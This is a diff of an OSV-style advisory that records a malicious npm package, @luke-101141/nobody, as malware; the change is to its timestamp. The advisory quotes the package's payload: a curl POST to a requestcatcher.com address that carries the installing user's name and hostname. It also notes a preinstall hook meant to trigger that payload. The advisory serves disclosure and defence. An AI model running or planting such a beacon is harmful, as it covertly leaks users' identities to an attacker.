@@ -2,7 +2,7 @@
   "schema_version": "1.7.5",
   "id": "MAL-2026-4229",
   "published": "2026-05-21T13:18:52Z",
-  "modified": "2026-05-26T06:01:55.497129682Z",
+  "modified": "2026-05-27T23:16:43.048173591Z",
   "summary": "Malicious code in @luke-101141/nobody (npm)",
   "details": "\n---\n_-= Per source details. Do not edit below this line.=-_\n\n## Source: amazon-inspector (8a22de475581dbf26085c2605781782a61205eb62add0a261eabe2357ac2cbc8)\nOn require(), index.js executes `curl -X POST \"http://frgthyujiouyh.requestcatcher.com/noderedactedsdk/$(whoami)/$(hostname)/\"`, leaking the installing user's identity and machine hostname over plaintext HTTP to an anonymous request-inspection service (requestcatcher.com) commonly used as a throwaway exfil sink. The package has no advertised functionality — empty description, no useful exports — its sole effect is the identity beacon. package.json also contains a top-level `\"preinstall\": \"node index.js\"` field outside the `scripts` block; as written it does not fire at install time, but the intent to trigger the same payload at `npm install` is explicit. Any consumer importing this package leaks host/user identity to the attacker.\n\n## Source: ossf-package-analysis (cd4cb72508248900987f8bd099896c95e232fee57835b5a89ac6b0d3178c2ed7)\nThe OpenSSF Package Analysis project identified '@luke-101141/nobody' @ 1.0.1 (npm) as malicious.\n\nIt is considered malicious because:\n\n- The package executes one or more commands associated with malicious behavior.\n",
   "affected": [
